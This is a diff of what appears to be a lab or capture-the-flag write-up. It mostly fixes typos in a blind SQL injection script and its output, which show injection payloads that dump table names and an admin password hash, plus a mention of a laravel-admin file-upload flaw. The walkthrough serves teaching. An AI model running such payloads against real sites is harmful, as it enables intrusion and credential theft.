@@ -305,7 +305,7 @@ def getDatabases():
 
 def getTables():
     print(colored(f"\n[+] CURRENT DATABASE: usage_blog\n", "cyan"))
-    p1 = log.progress(colored("Exploting Blind SQL Injection", "yellow"))
+    p1 = log.progress(colored("Exploiting Blind SQL Injection", "yellow"))
     p2 = log.progress(colored("Tables", "yellow"))
     content = ""
     
@@ -331,7 +331,7 @@ def getTables():
 
 def getColumns():
     print(colored("\n[+] CURRENT TABLE: admin_users\n", "cyan"))
-    p1 = log.progress(colored("Exploting Blind SQL Injection", "yellow"))
+    p1 = log.progress(colored("Exploiting Blind SQL Injection", "yellow"))
     p2 = log.progress(colored("Username And Password", "yellow"))
     content = ""
     
@@ -389,12 +389,12 @@ We can execute and get the DB `user` and `hash`:
 
 [+] CURRENT DATABASE: usage_blog
 
-[▁] Exploting Blind SQL Injection: test' or substring((select group_concat(table_name) from information_schema.tables where table_schema='usage_blog'),151,1)='s'-- -
+[▁] Exploiting Blind SQL Injection: test' or substring((select group_concat(table_name) from information_schema.tables where table_schema='usage_blog'),151,1)='s'-- -
 [*] Tables: admin_menu,admin_operation_log,admin_permissions,admin_role_menu,admin_role_permissions,admin_role_users,admin_roles,admin_user_permissions,admin_users
 
 [+] CURRENT TABLE: admin_users
 
-[◣] Exploting Blind SQL Injection: test' or substring((select group_concat((BINARY username), ':', (BINARY password)) from admin_users),66,1)='2'-- -
+[◣] Exploiting Blind SQL Injection: test' or substring((select group_concat((BINARY username), ':', (BINARY password)) from admin_users),66,1)='2'-- -
 [/] Username And Password: admin:$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2
 
 [+] USER: admin
@@ -445,7 +445,7 @@ Laravel is a `PHP-based` web framework for building, deploying and monitoring we
 
 Exactly, in this case, we're dealing with a `laravel-admin`.
 
-Searching on Google, we found that this version of laravel-admin is vulnerable to a Arbitrary File Upload: `(CVE-2023-2424)`
+After a quick search, we discovered that this version of `laravel-admin` is vulnerable to an `Arbitrary File Upload` (CVE-2023-2424).
 
 <br />
 
